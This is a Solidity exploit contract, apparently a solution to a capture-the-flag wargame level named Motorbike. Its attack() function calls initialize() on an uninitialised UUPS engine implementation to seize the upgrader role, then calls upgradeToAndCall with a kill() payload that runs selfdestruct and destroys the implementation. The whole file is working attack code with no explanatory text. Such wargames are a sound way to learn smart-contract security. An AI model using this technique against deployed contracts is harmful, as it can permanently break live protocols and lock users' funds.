// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

interface IEngine {
    function upgrader() external returns(address);
    function horsePower() external returns(uint);
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
    function initialize() external;
}

contract MotorbikeAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        IEngine(challengeInstance).initialize();
        IEngine(challengeInstance).upgradeToAndCall(address(this), abi.encodeWithSignature("kill()"));
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}
